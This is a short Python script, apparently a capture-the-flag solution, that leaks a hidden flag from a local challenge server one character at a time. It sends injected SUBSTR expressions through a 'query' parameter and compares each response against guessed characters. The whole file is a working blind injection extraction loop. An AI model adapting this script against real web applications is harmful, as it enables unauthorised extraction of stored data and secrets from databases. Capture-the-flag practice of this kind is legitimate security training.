import requests

flag = ""
count = 0
key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.-{}"

PARAMS = {"query": ""}
URL = "http://challenge.localhost:80/"

def get_result(str):
	x = str.split("<pre>")
	x = x[2].split("</pre>")
	return x[0]

while(count < 58):
	for c in key:
		PARAMS["query"] = f"SUBSTR(flag, {count}, 1)"
		r = requests.get(url = URL, params = PARAMS)
		cmp1 = get_result(r.text)
		PARAMS["query"] = f"'{c}'"
		r = requests.get(url = URL, params = PARAMS)
		cmp2 = get_result(r.text)
		if (cmp1 == cmp2):
			flag += c
			break;

	count += 1
	print(flag)

print("------------------------------------------------------\n\n")
print(flag)
print("\n\n------------------------------------------------------")
